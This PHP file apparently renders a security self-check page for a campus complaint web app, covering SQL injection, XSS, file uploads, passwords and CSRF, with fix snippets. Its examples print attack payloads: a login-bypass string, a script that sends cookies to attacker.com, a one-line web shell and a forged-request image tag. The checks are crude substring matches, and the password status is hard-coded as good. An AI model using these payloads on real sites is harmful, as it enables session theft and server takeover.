<?php
/**
 * Security Test Suite for Pengaduan Kampus
 * Run this file to test for common vulnerabilities
 */

$title = "Security Test Results";

echo "<!DOCTYPE html>
<html>
<head>
    <title>$title</title>
    <link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css' rel='stylesheet'>
    <style>
        .code-block { background: #f4f4f4; padding: 10px; border-radius: 5px; font-family: monospace; overflow-x: auto; }
        .vulnerable { border-left: 4px solid #dc3545; }
        .fixed { border-left: 4px solid #28a745; }
        .test-pass { background: #d4edda; border-left: 4px solid #28a745; }
        .test-fail { background: #f8d7da; border-left: 4px solid #dc3545; }
    </style>
</head>
<body>
<div class='container mt-5'>
<h1 class='mb-4'>Security Test Results</h1>
<p class='text-muted'>Last updated: " . date('Y-m-d H:i:s') . "</p>";

// ==================== SQL INJECTION ====================
echo "<div class='card mb-4'><div class='card-body'>";
echo "<h5>1. SQL Injection Test</h5>";

echo "<div class='alert alert-danger'><strong>Risk: HIGH</strong> - SQL Injection can allow attackers to access, modify, or delete database data</div>";

echo "<h6>What is SQL Injection?</h6>";
echo "<p>Attackers insert malicious SQL code through user inputs to manipulate the database.</p>";

echo "<h6>Example Attack:</h6>";
echo "<div class='code-block vulnerable'><pre>";
echo "Attacker enters this as email in login form: ' OR '1'='1\n\n";
echo "This changes the query to return ALL users, bypassing login!";
echo "</pre></div>";

echo "<h6>Current Status:</h6>";

// Check register.php
$reg = file_get_contents('auth/register.php');
$reg_secure = (strpos($reg, 'mysqli_prepare') !== false);
echo "<div class='code-block " . ($reg_secure ? 'test-pass' : 'test-fail') . " mb-2'>";
echo "<strong>auth/register.php</strong> - " . ($reg_secure ? "SECURE" : "VULNERABLE");
echo "</div>";

// Check login.php
$login = file_get_contents('auth/login.php');
$login_secure = (strpos($login, 'mysqli_prepare') !== false);
echo "<div class='code-block " . ($login_secure ? 'test-pass' : 'test-fail') . " mb-2'>";
echo "<strong>auth/login.php</strong> - " . ($login_secure ? "SECURE" : "NEEDS FIX");
echo "</div>";

// Check tambah_pengaduan.php
$tambah = file_get_contents('user/tambah_pengaduan.php');
$tambah_secure = (strpos($tambah, 'mysqli_prepare') !== false);
echo "<div class='code-block " . ($tambah_secure ? 'test-pass' : 'test-fail') . " mb-2'>";
echo "<strong>user/tambah_pengaduan.php</strong> - " . ($tambah_secure ? "SECURE" : "VULNERABLE");
echo "</div>";

echo "<h6>How to Fix:</h6>";
echo "<div class='code-block fixed'><pre>";
echo "VULNERABLE:\n";
echo '$query = mysqli_query($conn, "SELECT * FROM users WHERE email=\'$email\'");' . "\n\n";
echo "SECURE (use this):\n";
echo '$stmt = mysqli_prepare($conn, "SELECT * FROM users WHERE email = ?");' . "\n";
echo 'mysqli_stmt_bind_param($stmt, "s", $email);' . "\n";
echo 'mysqli_stmt_execute($stmt);' . "\n";
echo '$result = mysqli_stmt_get_result($stmt);';
echo "</pre></div>";
echo "</div></div>";

// ==================== XSS ====================
echo "<div class='card mb-4'><div class='card-body'>";
echo "<h5>2. XSS (Cross-Site Scripting) Test</h5>";

echo "<div class='alert alert-warning'><strong>Risk: MEDIUM</strong> - XSS allows attackers to inject malicious scripts</div>";

echo "<h6>What is XSS?</h6>";
echo "<p>Attackers inject JavaScript code that executes in other users' browsers.</p>";

echo "<h6>Example Attack:</h6>";
echo "<div class='code-block vulnerable'><pre>";
echo "Attacker sets their name to:\n";
echo "&lt;script&gt;document.location='http://attacker.com?c='+document.cookie&lt;/script&gt;\n\n";
echo "When admin views the data, the script runs and steals the session!";
echo "</pre></div>";

echo "<h6>Current Status:</h6>";

$dashboard = file_get_contents('user/dashboard.php');
$dash_escaped = (strpos($dashboard, 'htmlspecialchars') !== false);
echo "<div class='code-block " . ($dash_escaped ? 'test-pass' : 'test-fail') . " mb-2'>";
echo "<strong>user/dashboard.php</strong> - " . ($dash_escaped ? "ESCAPED" : "NOT ESCAPED");
echo "</div>";

$admin = file_get_contents('admin/kelola_pengaduan.php');
$admin_escaped = (strpos($admin, 'htmlspecialchars') !== false);
echo "<div class='code-block " . ($admin_escaped ? 'test-pass' : 'test-fail') . " mb-2'>";
echo "<strong>admin/kelola_pengaduan.php</strong> - " . ($admin_escaped ? "ESCAPED" : "NOT ESCAPED");
echo "</div>";

echo "<h6>How to Fix:</h6>";
echo "<div class='code-block fixed'><pre>";
echo "VULNERABLE:\necho \$_SESSION['nama'];\n\n";
echo "SECURE:\necho htmlspecialchars(\$_SESSION['nama'], ENT_QUOTES, 'UTF-8');";
echo "</pre></div>";
echo "</div></div>";

// ==================== FILE UPLOAD ====================
echo "<div class='card mb-4'><div class='card-body'>";
echo "<h5>3. File Upload Security Test</h5>";

echo "<div class='alert alert-danger'><strong>Risk: HIGH</strong> - Unsecured uploads can lead to remote code execution</div>";

echo "<h6>What is the Risk?</h6>";
echo "<p>Attackers can upload PHP files and execute commands on your server.</p>";

echo "<h6>Example Attack:</h6>";
echo "<div class='code-block vulnerable'><pre>";
echo "Attacker creates shell.php:\n";
echo "&lt;?php system(\$_GET['cmd']); ?&gt;\n\n";
echo "Then visits: yoursite.com/uploads/shell.php?cmd=whoami\n";
echo "Now they can run ANY command on your server!";
echo "</pre></div>";

echo "<h6>Current Status:</h6>";

$tambah = file_get_contents('user/tambah_pengaduan.php');
$has_finfo = (strpos($tambah, 'finfo_open') !== false);
$has_size = (strpos($tambah, 'filesize') !== false || strpos($tambah, '5 * 1024') !== false);

echo "<div class='code-block " . ($has_finfo ? 'test-pass' : 'test-fail') . " mb-2'>";
echo "<strong>MIME Type Check</strong> - " . ($has_finfo ? "SECURE" : "VULNERABLE");
echo "</div>";

echo "<div class='code-block " . ($has_size ? 'test-pass' : 'test-fail') . " mb-2'>";
echo "<strong>File Size Check</strong> - " . ($has_size ? "SECURE" : "VULNERABLE");
echo "</div>";

echo "<h6>How to Fix:</h6>";
echo "<div class='code-block fixed'><pre>";
echo "Check MIME type:\n";
echo '$finfo = finfo_open(FILEINFO_MIME_TYPE);' . "\n";
echo '$mimeType = finfo_file($finfo, $tmpFile);' . "\n\n";
echo "Check size (max 5MB):\n";
echo 'if ($_FILES[\'file\'][\'size\'] > 5 * 1024 * 1024) {' . "\n";
echo '    die("File too large!");' . "\n";
echo '}' . "\n\n";
echo "Rename to prevent execution:\n";
echo '$safeName = time() . "_" . preg_replace("/[^a-zA-Z0-9.]/", "_", $namaFile);';
echo "</pre></div>";
echo "</div></div>";

// ==================== PASSWORD ====================
echo "<div class='card mb-4'><div class='card-body'>";
echo "<h5>4. Password Security Test</h5>";

$register = file_get_contents('auth/register.php');
$uses_hash = (strpos($register, 'password_hash') !== false);

echo "<div class='alert alert-success'><strong>Status: GOOD</strong> - Using secure password hashing</div>";

echo "<div class='code-block " . ($uses_hash ? 'test-pass' : 'test-fail') . " mb-2'>";
echo "<strong>Password Hashing</strong> - " . ($uses_hash ? "Using password_hash()" : "NOT SECURE");
echo "</div>";

echo "<h6>What to Improve:</h6>";
echo "<ul>";
echo "<li>Add minimum password length (8+ characters)</li>";
echo "<li>Add complexity requirements</li>";
echo "</ul>";
echo "</div></div>";

// ==================== CSRF ====================
echo "<div class='card mb-4'><div class='card-body'>";
echo "<h5>5. CSRF (Cross-Site Request Forgery) Test</h5>";

echo "<div class='alert alert-warning'><strong>Risk: MEDIUM</strong> - Allows unauthorized actions</div>";

echo "<h6>What is CSRF?</h6>";
echo "<p>Attackers trick users into performing actions without their knowledge.</p>";

echo "<h6>Example Attack:</h6>";
echo "<div class='code-block vulnerable'><pre>";
echo "Attacker creates malicious page with:\n";
echo "&lt;img src='http://yoursite.com/admin/update_status.php?id=1&status=selesai'&gt;\n\n";
echo "If admin visits while logged in, status changes automatically!";
echo "</pre></div>";

$login = file_get_contents('auth/login.php');
$has_csrf = (strpos($login, 'csrf_token') !== false);

echo "<h6>Current Status:</h6>";
echo "<div class='code-block " . ($has_csrf ? 'test-pass' : 'test-fail') . " mb-2'>";
echo "<strong>CSRF Token in Forms</strong> - " . ($has_csrf ? "PRESENT" : "MISSING");
echo "</div>";

echo "<h6>How to Fix:</h6>";
echo "<div class='code-block fixed'><pre>";
echo "Add to form:\n";
echo '&lt;input type="hidden" name="csrf_token" value="&lt;?php echo $_SESSION[\'csrf_token\']; ?&gt;"&gt;' . "\n\n";
echo "Verify on form processing:\n";
echo 'if ($_POST[\'csrf_token\'] !== $_SESSION[\'csrf_token\']) {' . "\n";
echo '    die("CSRF validation failed!");' . "\n";
echo '}';
echo "</pre></div>";
echo "</div></div>";

// ==================== INPUT VALIDATION ====================
echo "<div class='card mb-4'><div class='card-body'>";
echo "<h5>6. Input Validation Test</h5>";

$register = file_get_contents('auth/register.php');
$has_trim = (strpos($register, 'trim(') !== false);
$has_filter = (strpos($register, 'filter_var') !== false);

echo "<div class='alert alert-info'><strong>Status: PARTIAL</strong> - Some validation present</div>";

echo "<div class='code-block " . ($has_trim ? 'test-pass' : 'test-fail') . " mb-2'>";
echo "<strong>Input Trimming</strong> - " . ($has_trim ? "PRESENT" : "MISSING");
echo "</div>";

echo "<div class='code-block " . ($has_filter ? 'test-pass' : 'test-fail') . " mb-2'>";
echo "<strong>Email Validation</strong> - " . ($has_filter ? "PRESENT" : "MISSING");
echo "</div>";
echo "</div></div>";

// ==================== SUMMARY ====================
echo "<div class='card bg-dark text-white mb-4'><div class='card-body'>";
echo "<h5>Security Summary</h5>";

echo "<table class='table table-dark table-striped'>";
echo "<thead><tr><th>Vulnerability</th><th>Risk</th><th>Status</th></tr></thead>";
echo "<tbody>";

$sql_status = $login_secure ? "Partial" : "Needs Fix";
echo "<tr><td>SQL Injection</td><td>HIGH</td><td>$sql_status</td></tr>";

$xss_status = ($dash_escaped && $admin_escaped) ? "Fixed" : "Partial";
echo "<tr><td>XSS</td><td>MEDIUM</td><td>$xss_status</td></tr>";

$upload_status = ($has_finfo && $has_size) ? "Fixed" : "Needs Fix";
echo "<tr><td>File Upload</td><td>HIGH</td><td>$upload_status</td></tr>";

echo "<tr><td>Password</td><td>LOW</td><td class='text-success'>OK</td></tr>";

$csrf_status = $has_csrf ? "Partial" : "Needs Fix";
echo "<tr><td>CSRF</td><td>MEDIUM</td><td>$csrf_status</td></tr>";

$input_status = ($has_trim && $has_filter) ? "Good" : "Partial";
echo "<tr><td>Input Validation</td><td>MEDIUM</td><td>$input_status</td></tr>";

echo "</tbody></table>";

echo "<hr>";
echo "<h6>Quick Actions:</h6>";
echo "<a href='security_fix.php' class='btn btn-success'>Apply Security Fixes</a>";
echo "</div></div>";

echo "</div></body></html>";
?>